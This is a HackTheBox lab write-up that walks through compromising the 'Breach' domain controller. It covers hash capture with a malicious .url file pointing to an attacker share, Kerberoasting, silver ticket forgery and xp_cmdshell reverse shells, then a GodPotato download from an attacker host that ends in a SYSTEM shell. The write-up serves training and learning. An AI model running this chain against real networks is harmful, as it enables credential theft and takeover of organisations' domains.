# Breach — HackTheBox Writeup
**Difficulty:** Medium  
**Category:** Active Directory  
**Platform:** HackTheBox      
**Domain:** breach.vl  
**DC Hostname:** BREACHDC.breach.vl

---

## Attack Path Overview

```
Guest SMB Access
    → SCF/URL File Drop (NTLM Capture via Responder)
        → Julia.Wong NTLMv2 Hash Cracked
            → Kerberoasting (svc_mssql)
                → Silver Ticket Forge → MSSQL as Administrator
                    → xp_cmdshell → Reverse Shell (svc_mssql)
                        → GodPotato (SeImpersonatePrivilege)
                            → SYSTEM Shell
```

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

**Key open ports:**

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Microsoft IIS 10.0 |
| 88 | Kerberos | Windows Kerberos |
| 135 | MSRPC | Windows RPC |
| 139/445 | SMB | Windows Server 2022 |
| 389/636/3268/3269 | LDAP | AD LDAP — Domain: `breach.vl` |
| 1433 | MSSQL | Microsoft SQL Server 2019 RTM |
| 3389 | RDP | BREACHDC.breach.vl |
| 5985 | WinRM | HTTP API |

The scan reveals a **Windows Server 2022 Domain Controller** (`BREACHDC`) for the domain `breach.vl`, with MSSQL exposed on port 1433.

### /etc/hosts

```
10.129.xx.xx   BREACHDC.breach.vl breach.vl BREACHDC
```

---

## 2. SMB Enumeration (Guest / Null Auth)

### Check Guest Access

```bash
nxc smb 10.129.xx.xx -u guest -p ''
```

**Result:** Guest authentication succeeds (Null Auth enabled).

### Enumerate Shares

```bash
nxc smb 10.129.xx.xx -u guest -p '' --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share
share           READ,WRITE      
SYSVOL                          Logon server share
Users           READ
```

The `share` share allows **READ and WRITE** with guest access — a critical finding.

### Browse the Share

```bash
impacket-smbclient guest@10.129.xx.xx
```

```
# use share
# ls
  finance/
  software/
  transfer/

# cd transfer
# ls
  claire.pope/
  diana.pope/
  julia.wong/
```

The `transfer` directory contains user-named subdirectories. Direct access to them is denied, but since we have **write access to the parent**, we can plant a malicious file to capture NTLM hashes.

---

## 3. NTLM Hash Capture via Malicious URL File

Since we have write access to the `transfer` share, we can place a `.url` file that forces any user browsing the directory to authenticate to our machine, capturing their NTLMv2 hash via Responder.

### Create the Malicious URL File

```bash
cat evil.url
```

```ini
[InternetShortcut]
URL=asdasdas
WorkingDirectory=hehe
IconFile=\\10.10.xx.xx\share\desktop.ini
IconIndex=1
```

The `IconFile` field points to our attacker machine. When a user or automated process accesses this directory, Windows tries to load the icon over SMB — triggering NTLM authentication.

### Upload the File

```bash
impacket-smbclient guest@10.129.xx.xx
# use share
# cd transfer
# put evil.url
```

### Start Responder

```bash
sudo responder -I tun0
```

After a short wait, a hash is captured:

```
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:<REDACTED>
```

### Crack the Hash

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** Password cracked — `Julia.Wong : <REDACTED>`

---

## 4. SMB Access as Julia.Wong

### Verify Credentials

```bash
nxc smb 10.129.xx.xx -u Julia.Wong -p '<REDACTED>' --shares
```

**Result:** Login successful. Julia.Wong gains READ access to `NETLOGON` and `SYSVOL` in addition to the `share`.

### Read user.txt

```bash
impacket-smbclient Julia.Wong@10.129.xx.xx
# use share
# cd transfer/julia.wong
# cat user.txt
```

**Flag:** `<REDACTED>`

---

## 5. Active Directory Enumeration (BloodHound)

```bash
bloodhound-python -d breach.vl -u 'julia.wong' -p '<REDACTED>' \
  -dc 'BREACHDC.breach.vl' -c all -ns 10.129.xx.xx --dns-tcp
```

BloodHound analysis reveals that **`svc_mssql` is Kerberoastable** (has a registered SPN).

---

## 6. Kerberoasting — svc_mssql

```bash
impacket-GetUserSPNs 'breach.vl/julia.wong:<REDACTED>' -request
```

```
ServicePrincipalName              Name       
--------------------------------  ---------  
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql  
```

A TGS hash for `svc_mssql` is returned.

### Crack the TGS Hash

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:** Password cracked — `svc_mssql : <REDACTED>`

### Verify MSSQL Access

```bash
nxc mssql 10.129.xx.xx -u svc_mssql -p '<REDACTED>'
```

Login succeeds, but `svc_mssql` doesn't have significant SQL privileges directly.

---

## 7. Silver Ticket Attack → MSSQL Admin

Since we have the `svc_mssql` credentials and it owns the SPN `MSSQLSvc/breachdc.breach.vl:1433`, we can **forge a Silver Ticket** as the domain `Administrator` (RID 500) to gain `sysadmin` access to MSSQL without touching the KDC.

### Step 1 — Get the Domain SID

```bash
bloodyad -u svc_mssql -p '<REDACTED>' -d breach.vl -H 10.129.xx.xx \
  get object "DC=breach,DC=vl" --attr objectSid
```

```
objectSid: S-1-5-21-2330692793-3312915120-706255856
```

### Step 2 — Generate NT Hash of svc_mssql Password

```bash
pypykatz crypto nt '<REDACTED>'
```

**Result:** NT hash of `svc_mssql` — `<REDACTED>`

### Step 3 — Forge the Silver Ticket

```bash
impacket-ticketer \
  -spn MSSQLSvc/breachdc.breach.vl \
  -domain-sid S-1-5-21-2330692793-3312915120-706255856 \
  -nthash <REDACTED> \
  -dc-ip 10.129.xx.xx \
  -domain breach.vl \
  -user-id 500 Administrator
```

This creates `Administrator.ccache` — a valid Kerberos ticket impersonating Administrator for the MSSQL SPN.

### Step 4 — Use the Ticket

```bash
export KRB5CCNAME=Administrator.ccache
```

### Step 5 — Connect to MSSQL via Kerberos

```bash
impacket-mssqlclient -k -no-pass -windows-auth breachdc.breach.vl
```

```
SQL (BREACH\Administrator  dbo@master)>
```

### Confirm sysadmin

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns: 1
```

---

## 8. Remote Code Execution via xp_cmdshell

### Enable xp_cmdshell

```sql
enable_xp_cmdshell
```

### Verify Execution Context

```sql
xp_cmdshell "whoami /all"
```

The process runs as `breach\svc_mssql` with **`SeImpersonatePrivilege` enabled** — a critical privilege for privilege escalation.

### Get a Reverse Shell

Send a PowerShell reverse shell (base64-encoded) back to the attacker:

```sql
xp_cmdshell "powershell -e <BASE64_ENCODED_REVERSE_SHELL>"
```

**Listener:**

```bash
nc -nlvp 4444
```

**Shell received:**

```
PS C:\Windows\system32> whoami
breach\svc_mssql
```

---

## 9. Privilege Escalation — GodPotato → SYSTEM

`svc_mssql` has `SeImpersonatePrivilege`. We use **GodPotato** to abuse this and impersonate NT AUTHORITY\SYSTEM.

### Download GodPotato to Target

```powershell
PS C:\Users\Public> wget 10.10.xx.xx/GodPotato-NET4.exe -outfile G.exe
```

### Test Execution

```powershell
PS C:\Users\Public> ./G.exe -cmd 'whoami'
```

```
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid XXXX
nt authority\system
```

### Spawn a SYSTEM Reverse Shell

```powershell
PS C:\Users\Public> ./G.exe -cmd "powershell -e <BASE64_ENCODED_REVERSE_SHELL>"
```

**Listener:**

```bash
nc -nlvp 4445
```

**Shell received:**

```
PS C:\Users\Public> whoami
nt authority\system
```

### Read root.txt

```powershell
PS C:\Users\Public> type C:\Users\Administrator\Desktop\root.txt
<REDACTED>
```

---

## Summary

### Step-by-Step Attack Chain

**1. Initial Recon**
Run an Nmap scan against the target. Identify it as a Windows Server 2022 Domain Controller (`BREACHDC.breach.vl`) for the domain `breach.vl`, with SMB (445), MSSQL (1433), LDAP, Kerberos, and WinRM exposed. Add the DC to `/etc/hosts`.

**2. SMB Guest Enumeration**
Use `netexec` with guest/null credentials to enumerate SMB shares. Discover the `share` share is readable and writable by everyone. Browse it to find a `transfer` directory containing user-named subdirectories (`claire.pope`, `diana.pope`, `julia.wong`).

**3. NTLM Hash Capture (SCF/URL File Coercion)**
Craft a malicious `.url` file with an `IconFile` field pointing to your attacker IP over SMB (`\\10.10.xx.xx\share\...`). Upload it to the writable `transfer` share. Start Responder on your VPN interface. Wait for a user (or automated process) to browse the directory — Windows auto-fetches the icon over SMB, triggering NTLM authentication and capturing `Julia.Wong`'s NTLMv2 hash.

**4. Hash Cracking**
Crack the captured NTLMv2 hash with John the Ripper and `rockyou.txt`. Recover Julia.Wong's plaintext password.

**5. User Flag**
Authenticate to SMB as `Julia.Wong`. Navigate to `transfer/julia.wong/` and read `user.txt`.

**6. BloodHound Enumeration**
Run `bloodhound-python` as `Julia.Wong` to collect all AD objects. Ingest into BloodHound. Identify that `svc_mssql` has an SPN registered (`MSSQLSvc/breachdc.breach.vl:1433`), making it **Kerberoastable**.

**7. Kerberoasting**
Use `impacket-GetUserSPNs` as `Julia.Wong` to request a TGS ticket for `svc_mssql`. Crack the resulting krb5tgs hash with John and `rockyou.txt` to recover `svc_mssql`'s password.

**8. Silver Ticket Forgery**
Note that direct `svc_mssql` SQL access lacks privileges. Since `svc_mssql` owns the MSSQL SPN and we know its password, forge a **Silver Ticket**:
- Retrieve the domain SID using `bloodyad`.
- Convert `svc_mssql`'s password to its NT hash using `pypykatz`.
- Use `impacket-ticketer` to forge a TGS for `MSSQLSvc/breachdc.breach.vl` as Administrator (RID 500), signed with `svc_mssql`'s NT hash.
- Export the ticket as `KRB5CCNAME` and connect to MSSQL with `-k -no-pass`.

**9. MSSQL Code Execution**
Connect to MSSQL with the forged ticket using `impacket-mssqlclient`. Confirm `sysadmin` membership. Enable `xp_cmdshell`. Run `whoami /all` to confirm you're running as `svc_mssql` with `SeImpersonatePrivilege` enabled. Send a base64-encoded PowerShell reverse shell via `xp_cmdshell` to get an interactive shell on the target.

**10. Privilege Escalation (GodPotato)**
Download `GodPotato-NET4.exe` to `C:\Users\Public\` from your attacker HTTP server. Run it with a PowerShell reverse shell command. GodPotato abuses `SeImpersonatePrivilege` via DCOM/RPC to impersonate the SYSTEM token. Catch the second reverse shell to receive a `nt authority\system` shell.

**11. Root Flag**
Read `C:\Users\Administrator\Desktop\root.txt` to complete the machine.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `netexec (nxc)` | SMB/MSSQL authentication and share enumeration |
| `impacket-smbclient` | SMB file browsing and upload |
| `Responder` | NTLM hash capture via poisoning |
| `john` | Password and hash cracking |
| `bloodhound-python` | Active Directory enumeration |
| `impacket-GetUserSPNs` | Kerberoasting |
| `bloodyad` | LDAP attribute queries |
| `pypykatz` | NT hash generation |
| `impacket-ticketer` | Silver ticket forgery |
| `impacket-mssqlclient` | MSSQL client with Kerberos auth |
| `GodPotato` | SeImpersonatePrivilege → SYSTEM escalation |
| `netcat` | Reverse shell listener |
